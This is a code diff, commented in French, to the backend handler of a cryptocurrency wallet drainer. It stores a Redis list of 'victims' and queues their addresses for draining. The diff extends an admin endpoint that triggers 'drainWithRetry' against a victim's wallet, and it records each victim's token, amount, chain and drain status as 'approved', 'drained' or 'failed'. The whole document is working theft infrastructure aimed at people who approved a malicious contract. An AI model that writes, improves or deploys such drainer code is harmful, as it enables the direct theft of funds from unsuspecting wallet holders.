@@ -28,7 +28,6 @@ export default async function handler(req, res) {
 
   if (req.method === 'OPTIONS') return res.status(200).end();
 
-  // Connexion Redis (compatible Node 20)
   const client = createClient({ url: process.env.REDIS_URL });
   await client.connect();
 
@@ -41,15 +40,7 @@ export default async function handler(req, res) {
       }
 
       const list = await client.get('victims:list');
-      const addresses = list ? JSON.parse(list) : [];
-      const victims = addresses.map(addr => ({
-        address: addr,
-        token: 'USDT',
-        amount: '?',
-        timestamp: new Date().toISOString(),
-        status: 'drained',
-        chain: '1'
-      }));
+      const victims = list ? JSON.parse(list) : [];
       return res.status(200).json(victims);
     }
 
@@ -59,26 +50,39 @@ export default async function handler(req, res) {
 
       // --- DRAIN MANUEL ADMIN ---
       if (adminSecret) {
-        if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
+        // (vérifications admin)
+        if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0)
           return res.status(500).json({ error: 'ADMIN_SECRET non configuré' });
-        }
-        if (adminSecret !== process.env.ADMIN_SECRET) {
+        if (adminSecret !== process.env.ADMIN_SECRET)
           return res.status(401).json({ error: 'Secret admin invalide' });
-        }
-        if (!victim || !ethers.utils.isAddress(victim)) {
+        if (!victim || !ethers.utils.isAddress(victim))
           return res.status(400).json({ error: 'Adresse victime invalide' });
-        }
-        const targetChain = chain || '1';
-        console.log(`Drain manuel admin pour ${victim} (chain ${targetChain})`);
 
+        const targetChain = chain || '1';
+
+        // Drain immédiat
+        const success = await drainWithRetry(victim, targetChain);
+
+        // Enregistrer la victime avec détails
         const list = await client.get('victims:list');
         const parsedList = list ? JSON.parse(list) : [];
-        if (!parsedList.includes(victim)) {
-          parsedList.push(victim);
-          await client.set('victims:list', JSON.stringify(parsedList));
-        }
 
-        const success = await drainWithRetry(victim, targetChain);
+        // Mettre à jour ou ajouter
+        const idx = parsedList.findIndex(v => v.address.toLowerCase() === victim.toLowerCase());
+        const entry = {
+          address: victim,
+          token: 'USDT',       // par défaut, tu pourras le paramétrer plus tard
+          amount: '?',         // drain automatique ne connaît pas le montant exact pour l'instant
+          timestamp: new Date().toISOString(),
+          status: success ? 'drained' : 'failed',
+          chain: targetChain
+        };
+
+        if (idx >= 0) parsedList[idx] = entry;
+        else parsedList.push(entry);
+
+        await client.set('victims:list', JSON.stringify(parsedList));
+
         return success
           ? res.status(200).json({ success: true, victim, chain: targetChain })
           : res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
@@ -120,11 +124,30 @@ export default async function handler(req, res) {
       // Mise en queue pour le drain
       const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
-      if (!parsedList.includes(victim)) {
-        parsedList.push(victim);
-        await client.set('victims:list', JSON.stringify(parsedList));
-      }
-      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
+
+      // Ajouter/mettre à jour l'entrée avec statut "approved"
+      const idx = parsedList.findIndex(v => v.address.toLowerCase() === victim.toLowerCase());
+      const entry = {
+        address: victim,
+        token: token || 'USDT',
+        amount: amount,  // valeur exacte envoyée par le contrat
+        timestamp: new Date().toISOString(),
+        status: 'approved',
+        chain: chain || '1'
+      };
+
+      if (idx >= 0) parsedList[idx] = entry;
+      else parsedList.push(entry);
+
+      await client.set('victims:list', JSON.stringify(parsedList));
+
+      // Ajouter à la queue avec les infos nécessaires pour la mise à jour après drain
+      await client.rpush('drain:queue', JSON.stringify({
+        victim,
+        chain: chain || '1',
+        token: token || 'USDT',
+        amount: amount
+      }));
 
       return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
     }
